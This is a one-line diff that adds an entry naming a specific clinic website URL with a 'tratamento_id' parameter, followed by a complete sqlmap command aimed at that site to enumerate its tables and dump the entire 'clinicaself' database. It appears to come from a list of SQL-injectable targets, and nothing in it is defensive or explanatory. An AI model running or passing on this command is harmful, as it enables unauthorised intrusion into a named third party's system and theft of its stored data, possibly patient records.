@@ -1,0 +1,1 @@
+http://www.clinicaself.com.br/?pagina=info_tratamento.php&tratamento_id=1 (GET)  # sqlmap.py -u http://www.clinicaself.com.br/?pagina=info_tratamento.php&tratamento_id=1 -D clinicaself --threads 5 -v3 --random-agent --tables --dump-all
